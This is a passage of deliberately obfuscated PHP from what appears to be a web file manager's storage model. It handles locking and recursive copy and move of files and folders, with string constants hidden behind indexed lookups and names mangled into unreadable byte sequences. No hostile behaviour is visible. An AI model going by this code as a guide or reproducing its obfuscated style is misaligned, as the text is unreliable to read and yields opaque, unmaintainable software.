CacheLock::setErrorMsg($é¸‹­Ïç[161] . htmlspecialchars($´áÙ”’Å[$é¸‹­Ïç[32]]) . $é¸‹­Ïç[529] . $¸÷ŒÆüõ); $this->_lockKey($µ¾±±, 1); $this->_lockKey($µ¾±±, 0); $—ú£Êá = array_reverse($this->parentLevelArray($´áÙ”’Å[$é¸‹­Ïç[514]])); foreach ($—ú£Êá as $ÚÈ‘Êñ§) { $µ¾±± = $İÁ£Ö³ã . $é¸‹­Ïç[554] . $ÚÈ‘Êñ§; if (CacheLock::lockGet($é¸‹­Ïç[555] . $µ¾±±)) { $´áÙ”’Å = $this->sourceInfo($ÚÈ‘Êñ§); CacheLock::setErrorMsg($é¸‹­Ïç[161] . htmlspecialchars($´áÙ”’Å[$é¸‹­Ïç[32]]) . $é¸‹­Ïç[529] . $¸÷ŒÆüõ); $this->_lockKey($µ¾±±, 1); $this->_lockKey($µ¾±±, 0); } } } private function _lockCheckEnd($™ßµšÁß, $´”è‰Á) { $ïÄçÒ‘° =& $_SERVER[ê‘³Æ±]; $úáëì£ = $™ßµšÁß . $ïÄçÒ‘°[10] . $´”è‰Á; CacheLock::setErrorMsg($ïÄçÒ‘°[375]); if (!isset($this->_lockTimeStart[$úáëì£])) { return; } $ÚşßâÌ™ = timeFloat() - $this->_lockTimeStart[$úáëì£]; unset($this->_lockTimeStart[$úáëì£]); if ($ÚşßâÌ™ > 0.5) { unset(self::$cacheSourceInfo[$ïÄçÒ‘°[451] . $´”è‰Á]); } $‹ÂØù´º = $this->sourceInfo($´”è‰Á); if (!$‹ÂØù´º) { show_json(LNG($ïÄçÒ‘°[106]), !1); } } private function _lockParent($í€çƒÓ­, $ö‰ˆğ’®, $Èë”Ô»º) { if (!$this->autoLockSet) { return; } $ù©ôÖ¹Ê = $this->sourceInfo($í€çƒÓ­); if (!is_array($ù©ôÖ¹Ê)) { return; } $¬˜Œ°ï = array_reverse($this->parentLevelArray($ù©ôÖ¹Ê[$_SERVER[ê‘³Æ±][514]])); foreach ($¬˜Œ°ï as $¸¶ÖÇÂ) { $this->_lockEvent($¸¶ÖÇÂ, $ö‰ˆğ’®, $Èë”Ô»º); } } private function _lockEvent($ı¼ó÷°, $²Èå¼å‹, $ø³°½Œˆ) { $¿û· ¯ =& $_SERVER[ê‘³Æ±]; if (!$this->autoLockSet) { return; } foreach ($²Èå¼å‹ as $ù¦¯Ü») { $Îœ…¶–– = $ù¦¯Ü» . $¿û· ¯[10] . $ı¼ó÷°; if ($ø³°½Œˆ && CacheLock::lockGet($¿û· ¯[555] . $Îœ…¶––)) { continue; } $this->_lockKey($Îœ…¶––, $ø³°½Œˆ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Åá©¾Öï, $²Á‚Ò±™ = 1) { $»Ëù®á = $_SERVER[ê‘³Æ±][555] . md5($Åá©¾Öï); if ($²Á‚Ò±™) { if (isset(self::$_lockItemArr[$»Ëù®á])) { return; } self::$_lockItemArr[$»Ëù®á] = 1; CacheLock::lock($»Ëù®á, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$»Ëù®á])) { return; } unset(self::$_lockItemArr[$»Ëù®á]); CacheLock::unlock($»Ëù®á); } } public function isParentOf($¸»¯‰¯–, $Å¼£¼Š¨) { $—‰¥×úæ =& $_SERVER[ê‘³Æ±]; $ëêéÔ¹Ì = $this->sourceInfo($¸»¯‰¯–); $˜åá„Œû = $this->sourceInfo($Å¼£¼Š¨); $æ„èÚ‘È = $ëêéÔ¹Ì[$—‰¥×úæ[514]] . $ëêéÔ¹Ì[$—‰¥×úæ[396]] . $—‰¥×úæ[50]; $ˆŒö‚¤ã = $˜åá„Œû[$—‰¥×úæ[514]] . $˜åá„Œû[$—‰¥×úæ[396]] . $—‰¥×úæ[50]; $µÖ¤µÔ‰ = strpos($ˆŒö‚¤ã, $æ„èÚ‘È) === 0; return $µÖ¤µÔ‰; } private $targetIsDelete = 0; public function copy($ııªÎ¡½, $Ôíâ²‰Ì, $ïÚÇ›³ = REPEAT_REPLACE, $±¨Ù´ = '') { $ÅÖæèŸ =& $_SERVER[ê‘³Æ±]; $öûË¹ËÈ = $this->sourceInfo($ııªÎ¡½); $ó“ŸÃü¯ = $this->sourceInfo($Ôíâ²‰Ì); if (!$öûË¹ËÈ || !$ó“ŸÃü¯ || $ó“ŸÃü¯[$ÅÖæèŸ[404]] != $ÅÖæèŸ[89]) { return !1; } if ($this->isParentOf($ııªÎ¡½, $Ôíâ²‰Ì)) { return !1; } $Ñ‡Ã‚Ú˜ = $±¨Ù´ ? $±¨Ù´ : $öûË¹ËÈ[$ÅÖæèŸ[32]]; $this->lockCopyStart($ııªÎ¡½); $this->lockWriteStart($Ôíâ²‰Ì, $Ñ‡Ã‚Ú˜); $»ß¶íÖ° = array($ÅÖæèŸ[556] => array(), $ÅÖæèŸ[557] => array(), $ÅÖæèŸ[558] => array()); $this->targetIsDelete = intval($öûË¹ËÈ[$ÅÖæèŸ[424]]); $½£»õèÍ = $this->fileNameExistCache($Ôíâ²‰Ì, $öûË¹ËÈ[$ÅÖæèŸ[32]]); $’ŒÈ¸ = $this->_copy($ııªÎ¡½, $Ôíâ²‰Ì, $ïÚÇ›³, $»ß¶íÖ°, !0, $±¨Ù´); $this->_childrenListClear(); $this->lockCopyEnd($ııªÎ¡½); $this->lockWriteEnd($Ôíâ²‰Ì, $Ñ‡Ã‚Ú˜); if ($öûË¹ËÈ[$ÅÖæèŸ[404]] == $ÅÖæèŸ[89] && $½£»õèÍ == $’ŒÈ¸) { $this->folderSizeResetChildren($½£»õèÍ); } Model($ÅÖæèŸ[559])->addAll($»ß¶íÖ°[$ÅÖæèŸ[557]], array(), !0); if ($½£»õèÍ != $’ŒÈ¸ || $öûË¹ËÈ[$ÅÖæèŸ[404]] == $ÅÖæèŸ[89]) { Model($ÅÖæèŸ[560])->eventCopy($’ŒÈ¸); } $this->saveAll($»ß¶íÖ°[$ÅÖæèŸ[558]]); Model($ÅÖæèŸ[194])->linkAdd($»ß¶íÖ°[$ÅÖæèŸ[556]]); $this->folderSizeReset($Ôíâ²‰Ì); $this->updateModifyTime($Ôíâ²‰Ì); return $’ŒÈ¸; } private function _copy($£ÌÁÒ¡Ã, $œœ“¼Ûê, $ŸÜı®¼û, &$Äİ¤ôí„, $Û×€—Úì, $Å†¶¶³æ = '') { $ÇÉ‹ó¹ =& $_SERVER[ê‘³Æ±]; $ñÊô€¿ = $this->sourceInfoCache($£ÌÁÒ¡Ã); $¬´Ù§÷¼ = $ñÊô€¿[$ÇÉ‹ó¹[404]] == $ÇÉ‹ó¹[89]; $ŞÁ §òÀ = $Å†¶¶³æ ? $Å†¶¶³æ : $ñÊô€¿[$ÇÉ‹ó¹[32]]; $ñÆ»Ò…ø = $this->fileNameExistCache($œœ“¼Ûê, $ŞÁ §òÀ); if ($Û×€—Úì) { $this->_childrenAllMake($£ÌÁÒ¡Ã); if ($¬´Ù§÷¼ && $ñÆ»Ò…ø) { $this->_childrenAllMake($ñÆ»Ò…ø); } } if (!$ñÆ»Ò…ø) { return $this->_copyCreate($£ÌÁÒ¡Ã, $œœ“¼Ûê, $ŞÁ §òÀ, $Äİ¤ôí„); } $îåå¢Ï = $ñÆ»Ò…ø; if ($¬´Ù§÷¼) { if ($ŸÜı®¼û == REPEAT_RENAME_FOLDER) { $ŞÁ §òÀ = $this->fileNameAutoCache($œœ“¼Ûê, $ŞÁ §òÀ, $ŸÜı®¼û, $¬´Ù§÷¼); $îåå¢Ï = $this->_copyCreate($£ÌÁÒ¡Ã, $œœ“¼Ûê, $ŞÁ §òÀ, $Äİ¤ôí„); } else { $ı·½éú” = $this->_childrenList($£ÌÁÒ¡Ã); foreach ($ı·½éú” as $©¾ñ° ®) { $this->_copy($©¾ñ° ®[$ÇÉ‹ó¹[396]], $ñÆ»Ò…ø, $ŸÜı®¼û, $Äİ¤ôí„, !1); } } } else { if ($ŸÜı®¼û == REPEAT_RENAME || $ŸÜı®¼û == REPEAT_RENAME_FOLDER) { $ŞÁ §òÀ = $this->fileNameAutoCache($œœ“¼Ûê, $ŞÁ §òÀ, $ŸÜı®¼û, $¬´Ù§÷¼); $îåå¢Ï = $this->_copyCreate($£ÌÁÒ¡Ã, $œœ“¼Ûê, $ŞÁ §òÀ, $Äİ¤ôí„); } else { if ($ŸÜı®¼û == REPEAT_REPLACE) { $‘½óüàÕ = $this->sourceInfoCache($ñÆ»Ò…ø); $¯ÜõéŸ = $this->fileHistory($‘½óüàÕ, $ñÊô€¿[$ÇÉ‹ó¹[460]], $ñÊô€¿[$ÇÉ‹ó¹[80]]); if ($¯ÜõéŸ) { $Äİ¤ôí„[$ÇÉ‹ó¹[556]][] = $ñÊô€¿[$ÇÉ‹ó¹[460]]; } } else { if ($ŸÜı®¼û == REPEAT_SKIP) { } } } Hook::trigger($ÇÉ‹ó¹[561], array($ÇÉ‹ó¹[562], $ñÊô€¿, 0)); } return $îåå¢Ï; } private function _copyCreate($¤¿Àşì , $ã«›€Ö¸, $¬áôş€­, &$”•Õ¢©) { $¤«ø¾Ö’ =& $_SERVER[ê‘³Æ±]; $÷ã‘¾Â = $this->sourceInfoCache($¤¿Àşì ); $¶ÌçÑÙ¾ = $this->sourceInfoCache($ã«›€Ö¸); $ÉÆğŠš‰ = $this->_makeItemData($÷ã‘¾Â, $¶ÌçÑÙ¾, $¬áôş€­); Hook::trigger($¤«ø¾Ö’[563], $ÉÆğŠš‰); Hook::trigger($¤«ø¾Ö’[564], array($¤«ø¾Ö’[565], $ÉÆğŠš‰, 0)); $è³¾šú¸ = $this->add($ÉÆğŠš‰); $«÷×å½– = array($¤«ø¾Ö’[396] => $è³¾šú¸, $¤«ø¾Ö’[32] => $¬áôş€­); $this->_copyApplyMeta($«÷×å½–, $”•Õ¢©); if ($÷ã‘¾Â[$¤«ø¾Ö’[404]] != $¤«ø¾Ö’[89]) { $”•Õ¢©[$¤«ø¾Ö’[556]][] = $÷ã‘¾Â[$¤«ø¾Ö’[460]]; return $è³¾šú¸; } $â‡É…çº = array(); $×¥€¥šÎ = array(); $this->_childrenListAll($¤¿Àşì , $â‡É…çº); $˜èèÎÒª = count($â‡É…çº); if ($˜èèÎÒª == 0) { return $è³¾šú¸; } $¹èé˜áè = $this->sourceInfo($è³¾šú¸); foreach ($â‡É…çº as $–²«äÅ‘) { $û×°ªÙõ = $this->_makeItemData($–²«äÅ‘, $¹èé˜áè, $–²«äÅ‘[$¤«ø¾Ö’[32]]); $û×°ªÙõ[$¤«ø¾Ö’[514]] = $–²«äÅ‘[$¤«ø¾Ö’[514]]; $×¥€¥šÎ[] = $û×°ªÙõ; } $this->chunkEventSet($¤«ø¾Ö’[566], array($¤«ø¾Ö’[567], $ÉÆğŠš‰, $˜èèÎÒª)); $this->addAll($×¥€¥šÎ, array(), !1); $ÙÀÊÍ¡á = $this->where(array($¤«ø¾Ö’[491] => $è³¾šú¸))->select(); $ë³ÏŒª„ = $this->_childrenMakeRelation($â‡É…çº, $ÙÀÊÍ¡á); $ë³ÏŒª„[$¤¿Àşì ] = $è³¾šú¸; $”øóñêò = array(); $×şÂ’Ù = array(); foreach ($ÙÀÊÍ¡á as $–²«äÅ‘) { $Üğ¿­Éê = $–²«äÅ‘[$¤«ø¾Ö’[396]]; $Ê–ŒÂŞ = $this->_childrenMatch($ë³ÏŒª„, $–²«äÅ‘, $¹èé˜áè); $”øóñêò[] = array($¤«ø¾Ö’[396], $Üğ¿­Éê, $¤«ø¾Ö’[491], $Ê–ŒÂŞ[$¤«ø¾Ö’[491]]); $×şÂ’Ù[] = array($¤«ø¾Ö’[396], $Üğ¿­Éê, $¤«ø¾Ö’[514], $Ê–ŒÂŞ[$¤«ø¾Ö’[514]]); $this->_copyApplyMeta($–²«äÅ‘, $”•Õ¢©); if ($–²«äÅ‘[$¤«ø¾Ö’[404]] != $¤«ø¾Ö’[89]) { $”•Õ¢©[$¤«ø¾Ö’[556]][] = $–²«äÅ‘[$¤«ø¾Ö’[460]]; } } $this->chunkEventSet($¤«ø¾Ö’[568], array($¤«ø¾Ö’[569], $ÉÆğŠš‰, $˜èèÎÒª)); $this->saveAll($”øóñêò); $this->chunkEventSet($¤«ø¾Ö’[570], array($¤«ø¾Ö’[571], $ÉÆğŠš‰, $˜èèÎÒª)); $this->saveAll($×şÂ’Ù); return $è³¾šú¸; } private function _childrenMakeRelation($ò”¥ï‹Ã, $›‡÷Şå) { $ƒñáŠÎ =& $_SERVER[ê‘³Æ±]; $‹È‘«—Õ = array(); $ı¢ÔËõÌ = array(); foreach ($ò”¥ï‹Ã as $¦¸Èê¾ä) { $×æÎïˆ¡ = $¦¸Èê¾ä[$ƒñáŠÎ[32]] . $ƒñáŠÎ[8] . $¦¸Èê¾ä[$ƒñáŠÎ[514]]; $‹È‘«—Õ[$×æÎïˆ¡] = $¦¸Èê¾ä[$ƒñáŠÎ[396]]; } foreach ($›‡÷Şå as $¦¸Èê¾ä) { $×æÎïˆ¡ = $¦¸Èê¾ä[$ƒñáŠÎ[32]] . $ƒñáŠÎ[8] . $¦¸Èê¾ä[$ƒñáŠÎ[514]]; $‘Ôò¶úü = $‹È‘«—Õ[$×æÎïˆ¡]; $ı¢ÔËõÌ[$‘Ôò¶úü] = $¦¸Èê¾ä[$ƒñáŠÎ[396]]; } return $ı¢ÔËõÌ; } private function _childrenMatch($ÊúŠÔËü, $——î×£æ, $Ó×”Èí½) { $ÁõëÜ…… =& $_SERVER[ê‘³Æ±]; $‰åãòÁÑ = $Ó×”Èí½[$ÁõëÜ……[514]]; $×§àãÇû = $this->parentLevelArray($——î×£æ[$ÁõëÜ……[514]]); foreach ($×§àãÇû as $²ïâÃîË) { if (isset($ÊúŠÔËü[$²ïâÃîË])) { $‰åãòÁÑ .= $ÊúŠÔËü[$²ïâÃîË] . $ÁõëÜ……[572]; } } $‰åãòÁÑ = rtrim($‰åãòÁÑ, $ÁõëÜ……[50]) . $ÁõëÜ……[50]; $Æë‰û‰¶ = $this->parentLevelArray($‰åãòÁÑ); $“Ì’šÉõ = $Æë‰û‰¶[count($Æë‰û‰¶) - 1]; return array($ÁõëÜ……[491] => $“Ì’šÉõ, $ÁõëÜ……[514] => $‰åãòÁÑ); } private function _makeItemData($ñÛ™íØ†, $†âáï³î, $·ÈáÑ‰) { $õ»§èŸ‰ =& $_SERVER[ê‘³Æ±]; $¿”è¤¿ = array($õ»§èŸ‰[573] => $ñÛ™íØ†[$õ»§èŸ‰[404]], $õ»§èŸ‰[414] => $·ÈáÑ‰, $õ»§èŸ‰[574] => $ñÛ™íØ†[$õ»§èŸ‰[406]] ? $ñÛ™íØ†[$õ»§èŸ‰[406]] : $õ»§èŸ‰[12], $õ»§èŸ‰[461] => $ñÛ™íØ†[$õ»§èŸ‰[460]] ? $ñÛ™íØ†[$õ»§èŸ‰[460]] : 0, $õ»§èŸ‰[575] => $ñÛ™íØ†[$õ»§èŸ‰[80]] ? $ñÛ™íØ†[$õ»§èŸ‰[80]] : 0, $õ»§èŸ‰[576] => intval($†âáï³î[$õ»§èŸ‰[405]]), $õ»§èŸ‰[577] => intval($†âáï³î[$õ»§èŸ‰[498]]), $õ»§èŸ‰[578] => intval(USER_ID), $õ»§èŸ‰[579] => intval(USER_ID), $õ»§èŸ‰[395] => intval($†âáï³î[$õ»§èŸ‰[396]]), $õ»§èŸ‰[580] => $†âáï³î[$õ»§èŸ‰[514]] . $†âáï³î[$õ»§èŸ‰[396]] . $õ»§èŸ‰[50], $õ»§èŸ‰[418] => $ñÛ™íØ†[$õ»§èŸ‰[86]] ? $ñÛ™íØ†[$õ»§èŸ‰[86]] : time(), $õ»§èŸ‰[423] => 0, $õ»§èŸ‰[581] => $õ»§èŸ‰[12]); return $¿”è¤¿; } private function _copyApplyMeta($³œÁ‘…œ, &$°‘˜ïÂ) { $Ñ»ã·å¸ =& $_SERVER[ê‘³Æ±]; $¿—»­ßõ = $³œÁ‘…œ[$Ñ»ã·å¸[396]]; $°¹¿Ö¦İ = $³œÁ‘…œ[$Ñ»ã·å¸[32]]; if (!isset($³œÁ‘…œ[$Ñ»ã·å¸[582]]) || !$³œÁ‘…œ[$Ñ»ã·å¸[582]] || $³œÁ‘…œ[$Ñ»ã·å¸[582]] == $Ñ»ã·å¸[192]) { $°‘˜ïÂ[$Ñ»ã·å¸[558]][] = array($Ñ»ã·å¸[396], $¿—»­ßõ, $Ñ»ã·å¸[582], short_id($¿—»­ßõ)); } if (Input::check($°¹¿Ö¦İ, $Ñ»ã·å¸[583])) { $°‘˜ïÂ[$Ñ»ã·å¸[557]][] = array($Ñ»ã·å¸[396] => $¿—»­ßõ, $Ñ»ã·å¸[95] => $Ñ»ã·å¸[457], $Ñ»ã·å¸[371] => str_replace($Ñ»ã·å¸[53], $Ñ»ã·å¸[12], Pinyin::get($°¹¿Ö¦İ))); $°‘˜ïÂ[$Ñ»ã·å¸[557]][] = array($Ñ»ã·å¸[396] => $¿—»­ßõ, $Ñ»ã·å¸[95] => $Ñ»ã·å¸[456], $Ñ»ã·å¸[371] => Pinyin::get($°¹¿Ö¦İ, $Ñ»ã·å¸[584])); } $°‘˜ïÂ[$Ñ»ã·å¸[557]][] = array($Ñ»ã·å¸[396] => $¿—»­ßõ, $Ñ»ã·å¸[95] => $Ñ»ã·å¸[435], $Ñ»ã·å¸[371] => KodSort::makeStr($°¹¿Ö¦İ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÚÏ©¿‡ß) { $Ş¤°éŒ =& $_SERVER[ê‘³Æ±]; $Ï²¦ŞòŠ = $this->sourceInfo($ÚÏ©¿‡ß); $¿À¾ø¹ğ = $Ş¤°éŒ[585]; $„¯¸‚Çó = array($Ş¤°éŒ[514] => array($Ş¤°éŒ[540], $Ï²¦ŞòŠ[$Ş¤°éŒ[514]] . $ÚÏ©¿‡ß . $Ş¤°éŒ[541]), $Ş¤°éŒ[424] => $this->targetIsDelete); $®‡äçøÛ = $this->field($¿À¾ø¹ğ)->where($„¯¸‚Çó)->select(); if (!$®‡äçøÛ) { return; } $®‡äçøÛ = array_to_keyvalue($®‡äçøÛ, $Ş¤°éŒ[396]); foreach ($®‡äçøÛ as $íïÏ§ÂÀ) { $¦Š§—µ° = $íïÏ§ÂÀ[$Ş¤°éŒ[491]]; $ÚÏ©¿‡ß = $íïÏ§ÂÀ[$Ş¤°éŒ[396]]; if (!isset($this->_childrenListCache[$ÚÏ©¿‡ß]) && $íïÏ§ÂÀ[$Ş¤°éŒ[404]] == $Ş¤°éŒ[89]) { $this->_childrenListCache[$ÚÏ©¿‡ß] = array(); } if (!isset($this->_childrenListCache[$¦Š§—µ°])) { $this->_childrenListCache[$¦Š§—µ°] = array(); } $this->_childrenListCache[$¦Š§—µ°][$ÚÏ©¿‡ß] = $íïÏ§ÂÀ; $this->_childrenItemCache[$ÚÏ©¿‡ß] = $íïÏ§ÂÀ; } } private function _childrenListAll($İä¸ä, &$áš·û¦”) { $¿ä‡ä¥Ì =& $_SERVER[ê‘³Æ±]; if (!isset($this->_childrenListCache[$İä¸ä])) { return; } $±¿òœ«Ÿ = $this->_childrenListCache[$İä¸ä]; foreach ($±¿òœ«Ÿ as $æ¥›–ã => $ø‘àÈ±å) { $áš·û¦”[$æ¥›–ã] = $ø‘àÈ±å; if ($ø‘àÈ±å[$¿ä‡ä¥Ì[404]] == $¿ä‡ä¥Ì[89]) { $this->_childrenListAll($æ¥›–ã, $áš·û¦”); } } } private function sourceInfoCache($ŒæĞ€Ğ¾) { if (isset($this->_childrenItemCache[$ŒæĞ€Ğ¾])) { return $this->_childrenItemCache[$ŒæĞ€Ğ¾]; } return $this->sourceInfo($ŒæĞ€Ğ¾); } private function _childrenList($È‰©ãÑ²) { if (isset($this->_childrenListCache[$È‰©ãÑ²])) { return $this->_childrenListCache[$È‰©ãÑ²]; } return $this->_childrenListSelect($È‰©ãÑ²); } private function _childrenListSelect($İ½Ùš³) { $ÉÁ’×Ë =& $_SERVER[ê‘³Æ±]; $ó­…­¾½ = array($ÉÁ’×Ë[491] => $İ½Ùš³, $ÉÁ’×Ë[424] => $this->targetIsDelete); $æµ…Óığ = $this->where($ó­…­¾½)->select(); $æµ…Óığ = $æµ…Óığ ? $æµ…Óığ : array(); $Š¨““õÊ = array_to_keyvalue($æµ…Óığ, $ÉÁ’×Ë[396]); $this->_childrenListCache[$İ½Ùš³] = $Š¨““õÊ; foreach ($Š¨““õÊ as $İ½Ùš³ => $ÒÄİ½ú) { $this->_childrenItemCache[$İ½Ùš³] = $ÒÄİ½ú; } return $Š¨““õÊ; } private function fileNameExistCache($Äœ§Ñ, $Å¹™ÙÃ) { $íàÂ¤ÑÛ =& $_SERVER[ê‘³Æ±]; $Å¹™ÙÃ = strtolower($Å¹™ÙÃ); $Á€¸ÈÅ = $this->_childrenList($Äœ§Ñ); foreach ($Á€¸ÈÅ as $à—ÇÏ³) { if ($Å¹™ÙÃ == strtolower($à—ÇÏ³[$íàÂ¤ÑÛ[32]])) { return $à—ÇÏ³[$íàÂ¤ÑÛ[396]]; } } return !1; } private function fileNameAutoCache($ùó­óŠ¢, $ûÛ—Úœğ, $¸Æ ÃáÖ, $ÍİÜºî¤) { $±‰ŒÎÀ³ =& $_SERVER[ê‘³Æ±]; $¿ÔÕÏ•ª = $this->_childrenList($ùó­óŠ¢); $ñÑæö‡… = array_to_keyvalue($¿ÔÕÏ•ª, $±‰ŒÎÀ³[12], $±‰ŒÎÀ³[32]); return $this->fileNameAutoGet($ñÑæö‡…, $ûÛ—Úœğ, $¸Æ ÃáÖ, $ÍİÜºî¤); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($”ÔÒæ¥, $ª´¶İğ¯, $Ì¤Èîå = REPEAT_REPLACE, $Â™•´½¶ = '') { $•ÃÄ¸¡² =& $_SERVER[ê‘³Æ±]; $ş†ŒÔ÷î = $this->sourceInfo($”ÔÒæ¥); $ĞÏ ¼óØ = $this->sourceInfo($ª´¶İğ¯); if ($ş†ŒÔ÷î[$•ÃÄ¸¡²[491]] == $ĞÏ ¼óØ[$•ÃÄ¸¡²[396]]) { if ($ş†ŒÔ÷î[$•ÃÄ¸¡²[424]] == $•ÃÄ¸¡²[89]) { Model($•ÃÄ¸¡²[422])->restore(array($”ÔÒæ¥)); } if (!$Â™•´½¶ || $Â™•´½¶ == $ş†ŒÔ÷î[$•ÃÄ¸¡²[32]]) { return $”ÔÒæ¥; } } $üÍÀÅÔô = $this->pathInfoMore($”ÔÒæ¥); if ($this->isParentOf($”ÔÒæ¥, $ª´¶İğ¯)) { return !1; } if (!$ş†ŒÔ÷î || !$ĞÏ ¼óØ || $ĞÏ ¼óØ[$•ÃÄ¸¡²[404]] != $•ÃÄ¸¡²[89]) { return !1; } Hook::trigger($•ÃÄ¸¡²[586], $üÍÀÅÔô); $this->targetIsDelete = intval($ş†ŒÔ÷î[$•ÃÄ¸¡²[424]]); if ($ş†ŒÔ÷î[$•ÃÄ¸¡²[491]] == $ª´¶İğ¯ && $Â™•´½¶ != $ş†ŒÔ÷î[$•ÃÄ¸¡²[32]]) { $ŠôÂÇŸ» = $this->fileNameExist($ª´¶İğ¯, $Â™•´½¶); if ($ŠôÂÇŸ» && $ş†ŒÔ÷î[$•ÃÄ¸¡²[404]] == $•ÃÄ¸¡²[192]) { $ÖŠ¢¯†Ò = $this->sourceInfo($ŠôÂÇŸ»); $ıö¢ü í = $this->fileHistory($ÖŠ¢¯†Ò, $ş†ŒÔ÷î[$•ÃÄ¸¡²[460]], $ş†ŒÔ÷î[$•ÃÄ¸¡²[80]]); if (!$ıö¢ü í) { Model($•ÃÄ¸¡²[463])->remove($ş†ŒÔ÷î[$•ÃÄ¸¡²[460]]); } $this->removeNow($”ÔÒæ¥, !1); $this->folderSizeReset($ª´¶İğ¯); Hook::trigger($•ÃÄ¸¡²[587], $üÍÀÅÔô); return $ŠôÂÇŸ»; } } $„£ÈğÈ = $Â™•´½¶ ? $Â™•´½¶ : $ş†ŒÔ÷î[$•ÃÄ¸¡²[32]]; $this->lockMoveStart($”ÔÒæ¥); $this->lockWriteStart($ª´¶İğ¯, $„£ÈğÈ); $ù‰ÍÕ… = array($•ÃÄ¸¡²[556] => array(), $•ÃÄ¸¡²[588] => !1); $this->clearShare($”ÔÒæ¥, $ª´¶İğ¯); $»Ôó­’Œ = $this->fileNameExistCache($ª´¶İğ¯, $ş†ŒÔ÷î[$•ÃÄ¸¡²[32]]); $ÃƒµÍØó = $this->_move($”ÔÒæ¥, $ª´¶İğ¯, $Ì¤Èîå, $ù‰ÍÕ…, $Â™•´½¶); $this->sourceCacheClear(); if ($ş†ŒÔ÷î[$•ÃÄ¸¡²[404]] == $•ÃÄ¸¡²[89] && $»Ôó­’Œ) { $this->folderSizeResetChildren($ÃƒµÍØó); } Model($•ÃÄ¸¡²[194])->linkAdd($ù‰ÍÕ…[$•ÃÄ¸¡²[556]]); if ($»Ôó­’Œ && $ù‰ÍÕ…[$•ÃÄ¸¡²[588]]) { $this->removeNow($”ÔÒæ¥, !1); } $this->lockMoveEnd($”ÔÒæ¥); $this->lockWriteEnd($ª´¶İğ¯, $„£ÈğÈ); $this->folderSizeReset($ş†ŒÔ÷î[$•ÃÄ¸¡²[491]]); $this->folderSizeReset($ª´¶İğ¯); $ì†ëÚÍÏ = array($ş†ŒÔ÷î[$•ÃÄ¸¡²[491]], $ª´¶İğ¯); if ($ş†ŒÔ÷î[$•ÃÄ¸¡²[404]] == $•ÃÄ¸¡²[89]) { $ì†ëÚÍÏ[] = $”ÔÒæ¥; } $this->updateModifyTime($ì†ëÚÍÏ); Model($•ÃÄ¸¡²[560])->eventMove($”ÔÒæ¥, $ş†ŒÔ÷î[$•ÃÄ¸¡²[491]], $ª´¶İğ¯); Hook::trigger($•ÃÄ¸¡²[587], $üÍÀÅÔô); return $ÃƒµÍØó; } private function _move($ı¯²‚²­, $³‰ÙßÙñ, $¦İÄú®, &$ï·¤ş¬š, $ÛÊÛ×Ğº = '') { $îÛ¦ïŒğ =& $_SERVER[ê‘³Æ±]; $ó·ıÎã = $this->sourceInfo($ı¯²‚²­); $´Ä‰ÂòÀ = $ó·ıÎã[$îÛ¦ïŒğ[404]] == $îÛ¦ïŒğ[89]; $·Î²šÄ = $ÛÊÛ×Ğº ? $ÛÊÛ×Ğº : $ó·ıÎã[$îÛ¦ïŒğ[32]]; $‚­ÂŒß† = $this->fileNameExistCache($³‰ÙßÙñ, $·Î²šÄ); $this->lockMoveStart($ı¯²‚²­); $this->lockWriteStart($³‰ÙßÙñ, $·Î²šÄ); if (!$‚­ÂŒß†) { return $this->_moveForce($ı¯²‚²­, $³‰ÙßÙñ, $·Î²šÄ); } $‹Íıšõş = $‚­ÂŒß†; $ „Ö¢ôÎ = !1; if ($´Ä‰ÂòÀ) { if ($¦İÄú® == REPEAT_RENAME_FOLDER) { $·Î²šÄ = $this->fileNameAuto($³‰ÙßÙñ, $·Î²šÄ, $¦İÄú®, $´Ä‰ÂòÀ); $‹Íıšõş = $this->_moveForce($ı¯²‚²­, $³‰ÙßÙñ, $·Î²šÄ); } else { if ($¦İÄú® == REPEAT_RENAME_FOLDER) { $¦İÄú® = REPEAT_RENAME; } $İ¹­†û¿ = $this->_childrenListSelect($ı¯²‚²­); foreach ($İ¹­†û¿ as $û·ÂâÖ¸) { $this->_move($û·ÂâÖ¸[$îÛ¦ïŒğ[396]], $‚­ÂŒß†, $¦İÄú®, $ï·¤ş¬š); } $ „Ö¢ôÎ = !0; } } else { if ($¦İÄú® == REPEAT_SKIP) { $ „Ö¢ôÎ = !0; } else { if ($¦İÄú® == REPEAT_RENAME || $¦İÄú® == REPEAT_RENAME_FOLDER) { $·Î²šÄ = $this->fileNameAuto($³‰ÙßÙñ, $·Î²šÄ, $¦İÄú®, $´Ä‰ÂòÀ); $‹Íıšõş = $this->_moveForce($ı¯²‚²­, $³‰ÙßÙñ, $·Î²šÄ); } else { if ($¦İÄú® == REPEAT_REPLACE) { $˜•ÏÊŸ† = $this->sourceInfoCache($‚­ÂŒß†); $êş÷›Á§ = $this->fileHistory($˜•ÏÊŸ†, $ó·ıÎã[$îÛ¦ïŒğ[460]], $ó·ıÎã[$îÛ¦ïŒğ[80]]); $ „Ö¢ôÎ = !0; if ($êş÷›Á§) { $ï·¤ş¬š[$îÛ¦ïŒğ[556]][] = $ó·ıÎã[$îÛ¦ïŒğ[460]]; } } } } } if ($ „Ö¢ôÎ && !$ï·¤ş¬š[$îÛ¦ïŒğ[588]]) { $ï·¤ş¬š[$îÛ¦ïŒğ[588]] = !0; } return $‹Íıšõş; } private function _moveForce($ßÕÚƒÎ, $ŸóËˆ¼æ, $—âşÄãç) { $Òš‰úà“ =& $_SERVER[ê‘³Æ±]; $ªãä½‹ = $this->sourceInfo($ßÕÚƒÎ); $Ø¨ãÆ÷ = $this->sourceInfo($ŸóËˆ¼æ); $øë§ÓË´ = $ªãä½‹[$Òš‰úà“[404]] == $Òš‰úà“[89]; $»™ÛŞ¤² = array($Òš‰úà“[395] => $Ø¨ãÆ÷[$Òš‰úà“[396]], $Òš‰úà“[580] => $Ø¨ãÆ÷[$Òš‰úà“[514]] . $Ø¨ãÆ÷[$Òš‰úà“[396]] . $Òš‰úà“[50], $Òš‰úà“[576] => $Ø¨ãÆ÷[$Òš‰úà“[405]], $Òš‰úà“[577] => $Ø¨ãÆ÷[$Òš‰úà“[498]], $Òš‰úà“[579] => USER_ID, $Òš‰úà“[414] => $—âşÄãç); $¹ÔıÅÂ” = $ªãä½‹[$Òš‰úà“[405]] == SourceModel::TYPE_GROUP && 